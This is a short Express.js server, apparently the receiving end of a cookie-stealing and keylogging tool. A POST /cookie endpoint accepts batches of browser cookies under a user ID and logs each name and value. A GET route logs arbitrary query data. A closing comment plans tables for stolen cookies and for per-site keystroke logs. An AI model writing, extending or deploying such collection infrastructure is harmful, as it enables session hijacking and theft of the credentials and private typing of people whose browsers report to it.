const express = require("express");
const app = express();
const port = 6900;

app.use(express.json());

app.get("/", (req, res) => {
  res.send(JSON.stringify(req.query));
  console.log(req.query);
});

app.post("/cookie", (req, res) => {
  res.send(JSON.stringify(req.body.data));
  if (!checkID(req.headers.uid)) return; //verify UID
  req.body.data.forEach(cookie => {
    console.log(cookie.name, " :", cookie.value);
  });
});

app.listen(port, () => {
  console.log(`Cookie logging listening at http://localhost:${port}`);
});

function checkID(uid) {
  console.log(uid);
  return uid ? uid.length === 10 : false;
}

/**
 * DB Setup
 * cookies table:
 *  userID, name, value, metadata (every other info except value and name)
 * keylogs table:
 *  userID, site, keystrokes
 */